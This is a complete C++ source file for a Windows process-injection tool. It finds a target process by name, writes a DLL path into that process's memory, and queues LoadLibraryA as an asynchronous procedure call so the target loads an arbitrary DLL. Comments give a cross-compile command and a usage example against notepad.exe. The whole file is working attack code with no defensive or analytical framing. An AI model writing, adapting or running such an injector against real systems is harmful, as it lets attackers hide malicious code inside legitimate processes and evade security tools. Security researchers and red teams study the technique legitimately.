#pragma warning(disable: 4996)
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

//x86_64-w64-mingw32-g++ InjectDllViaApcByProcessName.cpp -o apc_injector.exe -static -lwinmm -lws2_32 -ladvapi32 -lkernel32
// .\apc_injector.exe notepad.exe ArbitraryTestMessage.dll

using std::cout;
using std::endl;

DWORD process_to_pid(const char* process_name);
BOOL inject_module_to_process_by_pid(DWORD process_pid, const char* dll_full_path);

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage: " << argv[0] << " <ProcessName.exe> <FullPathToDll>\n";
        return 1;
    }

    const char* process_name = argv[1];
    const char* dll_full_path = argv[2];

    DWORD pid = process_to_pid(process_name);
    if (pid == 0) {
        cout << "Target process not found: " << process_name << endl;
        return 1;
    }

    cout << "Target PID: " << pid << endl;

    BOOL success = inject_module_to_process_by_pid(pid, dll_full_path);
    cout << "Injection result: " << (success ? "Success" : "Failure") << endl;

    return 0;
}

BOOL inject_module_to_process_by_pid(DWORD process_pid, const char* dll_full_path) {
    SIZE_T written = 0;
    BOOL success = FALSE;
    LPVOID remote_addr = NULL;
    SIZE_T path_len = lstrlenA(dll_full_path) + 1;

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_pid);
    if (!h_process) {
        cout << "OpenProcess failed. Error: " << GetLastError() << endl;
        return FALSE;
    }

    remote_addr = VirtualAllocEx(h_process, NULL, path_len, MEM_COMMIT, PAGE_READWRITE);
    if (!remote_addr) {
        cout << "VirtualAllocEx failed. Error: " << GetLastError() << endl;
        CloseHandle(h_process);
        return FALSE;
    }

    if (!WriteProcessMemory(h_process, remote_addr, dll_full_path, path_len, &written)) {
        cout << "WriteProcessMemory failed. Error: " << GetLastError() << endl;
        VirtualFreeEx(h_process, remote_addr, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    CloseHandle(h_process);  // Done with process handle

    // APC injection - find any thread in the target process
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    HANDLE thread_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (thread_snap == INVALID_HANDLE_VALUE) {
        cout << "Failed to create thread snapshot. Error: " << GetLastError() << endl;
        return FALSE;
    }

    if (Thread32First(thread_snap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == process_pid) {
                HANDLE h_thread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (h_thread) {
                    if (QueueUserAPC((PAPCFUNC)LoadLibraryA, h_thread, (ULONG_PTR)remote_addr)) {
                        success = TRUE;
                        cout << "APC queued on thread ID: " << te32.th32ThreadID << endl;
                    }
                    CloseHandle(h_thread);
                    if (success) break;
                }
            }
        } while (Thread32Next(thread_snap, &te32));
    } else {
        cout << "Thread32First failed. Error: " << GetLastError() << endl;
    }

    CloseHandle(thread_snap);
    return success;
}

DWORD process_to_pid(const char* process_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        cout << "CreateToolhelp32Snapshot failed. Error: " << GetLastError() << endl;
        return 0;
    }

    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    if (Process32First(snap, &pe32)) {
        do {
            if (_stricmp(process_name, pe32.szExeFile) == 0) {
                CloseHandle(snap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snap, &pe32));
    }

    CloseHandle(snap);
    return 0;
}
